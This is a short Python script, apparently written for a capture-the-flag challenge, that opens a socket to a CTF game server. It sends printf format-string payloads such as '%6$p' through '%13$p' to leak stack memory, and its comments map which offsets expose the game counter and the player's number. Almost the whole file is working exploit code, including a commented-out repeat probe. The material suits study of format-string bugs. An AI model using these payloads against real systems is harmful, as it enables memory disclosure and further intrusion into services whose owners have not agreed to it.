import socket

# ----------------------------------------------------------------------------------------------------------

sock = socket.socket()

sock.connect(("challenges.ctfd.io", 30426))
sock.recv(2048)
sock.recv(2048)
sock.send(b'2\n')
sock.recv(2048)
sock.send(b'202009\n')
sock.recv(2048)


offset = 6
frmt = 'p'

cmd = f'AAAA %{offset}${frmt} %{offset+1}${frmt} %{offset+2}${frmt} %{offset+3}${frmt} %{offset+4}${frmt} %{offset+5}${frmt} %{offset+6}${frmt} %{offset+7}${frmt}'

if(cmd.__len__()>64):
    print("CMD must be 64 bytes long, current length: " + str(cmd.__len__()))
    # exit()
# print(cmd)
sock.send(cmd.encode())
print(sock.recv(4096).decode())

sock.send(b'202009\n')
sock.recv(2048)
sock.recv(2048)
offset += 8

cmd = f'%{offset}${frmt} %{offset+1}${frmt} %{offset+2}${frmt} %{offset+3}${frmt} %{offset+4}${frmt} %{offset+5}${frmt} %{offset+6}${frmt} %{offset+7}${frmt}'

if(cmd.__len__()>64):
    print("CMD must be 64 bytes long, current length: " + str(cmd.__len__()))
    # exit()

sock.send(cmd.encode())
print(sock.recv(4096).decode())

# ----------------------------------------------------------------------------------------------------------

# https://en.wikipedia.org/wiki/Printf_format_string

# f'%{offset}${frmt} %{offset+1}${frmt} %{offset+2}${frmt} %{offset+3}${frmt} %{offset+4}${frmt} %{offset+5}${frmt} %{offset+6}${frmt} %{offset+7}${frmt}'

# %8$p will give number of games
# %7$p first 5 bits will give my number (left to right)

# Understand where point counter is on the stack by that information
# ----------------------------------------------------------------------------------------------------------

# sock = socket.socket()
# def reconnect
# sock.connect(("challenges.ctfd.io", 30426))
# sock.recv(2048)
# sock.recv(2048)
# sock.send(b'2\n')
# sock.recv(2048)
# sock.send(b'32\n')
# print(sock.recv(4096).decode())
# print(sock.recv(4096).decode())

# sock.send(b'202009\n')
# sock.recv(2048)
# # offset += 8

# cmd = "%20$p"

# if(cmd.__len__()>64):
#     print("CMD must be 64 bytes long, current length: " + str(cmd.__len__()))
#     # exit()

# sock.send(cmd.encode())
# print(sock.recv(4096).decode())

# ----------------------------------------------------------------------------------------------------------